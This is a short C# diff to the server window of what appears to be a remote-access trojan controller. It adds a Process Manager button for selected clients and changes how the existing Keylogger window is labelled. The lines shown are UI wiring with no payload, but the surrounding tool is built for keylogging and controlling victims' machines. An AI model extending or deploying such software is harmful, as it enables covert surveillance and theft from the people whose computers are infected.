@@ -682,13 +682,23 @@ public partial class ServerWindow : Window
                 new FunWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
     }
 
+    private void ProcessManager_Click(object sender, RoutedEventArgs e)
+    {
+        var clients = GetSelectedClients();
+        if (clients.Count == 0 || _server == null) return;
+        foreach (var c in clients)
+            OpenFeatureWindow<ProcessManagerWindow>(c.Id, () =>
+                new ProcessManagerWindow(_server, c.Id, c.Id));
+        Log($"[*] Process Manager opened for {clients.Count} client(s).");
+    }
+
     private void Keylogger_Click(object sender, RoutedEventArgs e)
     {
         var clients = GetSelectedClients();
         if (clients.Count == 0 || _server == null) return;
         foreach (var c in clients)
             OpenFeatureWindow<KeyloggerWindow>(c.Id, () =>
-                new KeyloggerWindow(_server, c.Id, $"{c.Username}@{c.IP}"));
+                new KeyloggerWindow(_server, c.Id, c.Id));
         Log($"[*] Keylogger opened for {clients.Count} client(s).");
     }
 
